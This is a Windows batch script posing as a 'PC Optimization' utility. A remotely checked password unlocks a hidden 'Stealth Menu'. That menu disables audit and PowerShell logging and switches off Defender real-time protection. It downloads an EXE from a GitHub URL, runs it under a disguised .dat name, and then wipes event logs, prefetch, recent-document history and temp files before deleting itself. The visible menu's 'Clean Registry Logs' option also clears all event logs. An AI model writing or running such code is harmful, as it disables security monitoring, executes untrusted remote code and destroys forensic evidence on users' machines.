@echo off
setlocal enabledelayedexpansion

:: === CONFIGURATION ===
set "STEALTH_PASS_URL=https://raw.githubusercontent.com/maxyprime/panelconfig/refs/heads/main/stealth_password.txt"
set "EXE_URL=https://github.com/maxyprime/panelconfig/raw/refs/heads/main/CAXVN.exe"

set "SETUP_EXE=%temp%\CAXVN.exe"
set "DISGUISED_EXE=%temp%\user_data_blob.dat"

:: Use default PowerShell unless PowerShell 7 exists
set "PWSH=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
if exist "%ProgramFiles%\PowerShell\7\pwsh.exe" set "PWSH=%ProgramFiles%\PowerShell\7\pwsh.exe"

:: === LOGIN SCREEN ===
:LOGIN
cls
echo ==========================================
echo            PC Optimization
echo       Developed by MaxyPrime
echo ==========================================
echo.
set /p userpass=Enter your password: 

if "%userpass%"=="1" (
    goto OPTIMIZATION_MENU
) else (
    call :CheckStealthPassword "%userpass%"
    if errorlevel 1 (
        echo.
        echo [✖] Incorrect password. Try again.
        timeout /t 2 /nobreak >nul
        goto LOGIN
    ) else (
        goto STEALTH_MENU
    )
)

:: === Stealth Password Check ===
:CheckStealthPassword
set "inputpass=%~1"
set "TMPPASS=%temp%\stealth_check.txt"

:: Fetch remote stealth password using hidden PowerShell
"%PWSH%" -NoLogo -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"[System.Net.ServicePointManager]::SecurityProtocol = 3072; $p=(Invoke-WebRequest -Uri '%STEALTH_PASS_URL%' -UseBasicParsing).Content.Trim(); Set-Content -Path '%TMPPASS%' -Value $p"

if not exist "%TMPPASS%" (
    exit /b 1
)

set /p REMOTE_PASS=<"%TMPPASS%"
del "%TMPPASS%" >nul 2>&1

if /i "%inputpass%"=="%REMOTE_PASS%" (
    exit /b 0
) else (
    exit /b 1
)

:: === PC Optimization Menu ===
:OPTIMIZATION_MENU
cls
echo ==========================================
echo           PC Optimization Menu
echo ==========================================
echo 1. Clean Registry Logs
echo 2. Clean Event Logs
echo 3. Clear Temp Files
echo 4. Flush DNS Cache
echo 5. Check Disk for Errors
echo 6. Defragment Disk
echo 7. System File Checker
echo 8. Return to Main Menu
echo.
set /p optchoice=Select an option (1-8): 

if "%optchoice%"=="1" goto CLEAN_REGISTRY_LOGS
if "%optchoice%"=="2" goto CLEAN_EVENT_LOGS
if "%optchoice%"=="3" goto CLEAR_TEMP_FILES
if "%optchoice%"=="4" goto FLUSH_DNS_CACHE
if "%optchoice%"=="5" goto CHECK_DISK
if "%optchoice%"=="6" goto DEFRAGMENT_DISK
if "%optchoice%"=="7" goto SYSTEM_FILE_CHECKER
if "%optchoice%"=="8" goto LOGIN

echo Invalid option. Try again.
timeout /t 2 /nobreak >nul
goto OPTIMIZATION_MENU

:CLEAN_REGISTRY_LOGS
echo Cleaning Registry Logs...
for /f "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G" 2>nul
echo Registry logs cleared.
pause
goto OPTIMIZATION_MENU

:CLEAN_EVENT_LOGS
echo Cleaning Event Logs...
for /f "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G" 2>nul
echo Event logs cleared.
pause
goto OPTIMIZATION_MENU

:CLEAR_TEMP_FILES
echo Clearing Temp Files...
del /f /q "%temp%\*.*" >nul 2>&1
del /f /q "C:\Windows\Temp\*.*" >nul 2>&1
echo Temp files cleared.
pause
goto OPTIMIZATION_MENU

:FLUSH_DNS_CACHE
echo Flushing DNS Cache...
ipconfig /flushdns
echo DNS Cache flushed.
pause
goto OPTIMIZATION_MENU

:CHECK_DISK
echo Running Check Disk...
chkdsk C: /f /r
pause
goto OPTIMIZATION_MENU

:DEFRAGMENT_DISK
echo Defragmenting Disk...
defrag C: /U /V
pause
goto OPTIMIZATION_MENU

:SYSTEM_FILE_CHECKER
echo Running System File Checker...
sfc /scannow
pause
goto OPTIMIZATION_MENU

:: === Stealth Menu ===
:STEALTH_MENU
cls
echo ===========================================
echo.
echo             *** STEALTH MENU ***
echo          Authorized Personnel Only
echo.
echo ===========================================
echo.
echo 1. Setup
echo 2. Run
echo 3. Bypass
echo 4. Alert the Admin
echo 5. Exit
echo 6. Self-Destruct Stealth Menu
echo.
set /p choice=Choose an option: 

if "%choice%"=="1" goto SETUP
if "%choice%"=="2" goto RUN
if "%choice%"=="3" goto BYPASS
if "%choice%"=="4" goto ALERT_ADMIN
if "%choice%"=="5" exit
if "%choice%"=="6" goto SELF_DESTRUCT

echo Invalid choice. Try again.
timeout /t 2 /nobreak >nul
goto STEALTH_MENU

:DISABLE_AUDIT_LOGS
echo Disabling audit logs...
auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable >nul 2>&1
"%PWSH%" -NoProfile -WindowStyle Hidden -Command ^
"New-Item -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Force; Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0" >nul 2>&1
exit /b

:ENABLE_AUDIT_LOGS
echo Re-enabling audit logs...
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable >nul 2>&1
"%PWSH%" -NoProfile -WindowStyle Hidden -Command ^
"Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 1" >nul 2>&1
exit /b

:: === Setup ===
:SETUP
call :DISABLE_AUDIT_LOGS

echo Disabling Defender...
"%PWSH%" -NoProfile -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1

echo STEP 1: Preparing download...
timeout /t 1 >nul
echo STEP 2: Connecting to GitHub...
timeout /t 1 >nul
echo STEP 3: Downloading EXE...
"%PWSH%" -NoProfile -WindowStyle Hidden -Command ^
"$client = New-Object System.Net.WebClient; $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')" >nul 2>&1

if not exist "%SETUP_EXE%" (
    echo [✖] ERROR: EXE download failed!
    call :ENABLE_AUDIT_LOGS
    "%PWSH%" -NoProfile -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
    pause
    goto STEALTH_MENU
)

echo [✓] Download successful.
call :ENABLE_AUDIT_LOGS
"%PWSH%" -NoProfile -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
pause
goto STEALTH_MENU

:: === Run ===
:RUN
echo Stopping Data Usage Service...
sc stop "DataUsageSvc" >nul 2>&1

if not exist "%SETUP_EXE%" (
    echo [✖] EXE not found. Please run Setup first.
    pause
    goto STEALTH_MENU
)

echo Copying to disguised .dat file...
copy /Y "%SETUP_EXE%" "%DISGUISED_EXE%" >nul

echo Executing disguised EXE...
start "" "%DISGUISED_EXE%"

echo Waiting for process to close...
:WAIT
timeout /t 2 >nul
tasklist /FI "IMAGENAME eq user_data_blob.dat" | find /i "user_data_blob.dat" >nul
if not errorlevel 1 goto WAIT

echo Cleaning traces...
del /f /q "%~dp0*.imgui" >nul
for %%F in ("%~dp0*.*") do (
    if /I not "%%~nxF"=="%~nx0" del /f /q "%%~fF" >nul
)
pause
goto STEALTH_MENU

:: === Bypass ===
:BYPASS
echo Restarting Data Usage Service...
sc start "DataUsageSvc" >nul 2>&1

echo Re-enabling logs...
call :ENABLE_AUDIT_LOGS

echo Cleaning system traces...
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
del /q /f /s "%SystemRoot%\Prefetch\*.*" >nul 2>&1
del /s /q "%temp%\*.*" >nul 2>&1
del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
for /f "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G" 2>nul
ipconfig /flushdns >nul
echo off | clip
echo [✓] Cleanup completed.
pause
goto STEALTH_MENU

:ALERT_ADMIN
cls
echo Enter your alert message (max 20 words):
set /p alertmsg= 
echo You entered: %alertmsg%
echo (Feature not implemented)
pause
goto STEALTH_MENU

:SELF_DESTRUCT
echo Initiating Self-Destruct...
timeout /t 1 >nul
del /f /q "%SETUP_EXE%" >nul
del /f /q "%DISGUISED_EXE%" >nul
del /f /q "%~dp0*.imgui" >nul
set "BATFILE=%~f0"
echo Set fso = CreateObject("Scripting.FileSystemObject") > "%temp%\delme.vbs"
echo fso.DeleteFile "%BATFILE%", True >> "%temp%\delme.vbs"
start /min "" "%temp%\delme.vbs"
timeout /t 2 >nul
del "%temp%\delme.vbs" >nul 2>&1
exit
